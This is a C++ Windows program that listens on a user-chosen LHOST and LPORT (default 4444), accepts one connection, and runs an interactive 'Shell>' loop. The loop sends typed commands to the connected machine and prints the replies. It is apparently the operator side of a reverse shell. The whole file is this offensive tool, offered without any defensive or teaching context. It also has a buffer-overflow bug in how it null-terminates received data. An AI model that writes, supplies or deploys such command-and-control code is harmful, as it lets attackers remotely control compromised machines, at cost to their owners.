#include <iostream>
#include <winsock2.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 4444

int main() {
    WSADATA wsa;
    SOCKET listener_socket, client_socket;
    struct sockaddr_in server, client;
    int c;
    char buffer[1024];
    std::string command;

    // Initialize Winsock
    std::cout << "Initializing Winsock..." << std::endl;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Create socket
    listener_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (listener_socket == INVALID_SOCKET) {
        std::cout << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Set up server information
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(DEFAULT_PORT);

    // Prompt for LHOST and LPORT
    char lhost[100], lport[6];
    std::cout << "Enter LHOST: ";
    std::cin >> lhost;
    std::cout << "Enter LPORT: ";
    std::cin >> lport;

    server.sin_addr.s_addr = inet_addr(lhost);
    server.sin_port = htons(atoi(lport));

    // Bind the socket
    if (bind(listener_socket, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cout << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(listener_socket);
        WSACleanup();
        return 1;
    }

    // Listen for incoming connections
    if (listen(listener_socket, 3) == SOCKET_ERROR) {
        std::cout << "Listen failed: " << WSAGetLastError() << std::endl;
        closesocket(listener_socket);
        WSACleanup();
        return 1;
    }

    std::cout << "Listening..." << std::endl;

    // Accept incoming client connection
    c = sizeof(struct sockaddr_in);
    client_socket = accept(listener_socket, (struct sockaddr *)&client, &c);
    if (client_socket == INVALID_SOCKET) {
        std::cout << "Accept failed: " << WSAGetLastError() << std::endl;
        closesocket(listener_socket);
        WSACleanup();
        return 1;
    }

    std::cout << "Connection established with " << inet_ntoa(client.sin_addr) << std::endl;

    // Interact with the client
    while (true) {
        // Prompt for command
        std::cout << "Shell> ";
        std::getline(std::cin, command);

        if (command == "exit") {
            break;
        }

        // Send command to the client
        send(client_socket, command.c_str(), command.length(), 0);

        // Receive the output of the command
        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received == SOCKET_ERROR) {
            std::cout << "Failed to receive data." << std::endl;
            break;
        }

        // Null-terminate and print output
        buffer[bytes_received] = '\0';
        std::cout << buffer << std::endl;
    }

    // Clean up
    closesocket(client_socket);
    closesocket(listener_socket);
    WSACleanup();
    return 0;
}
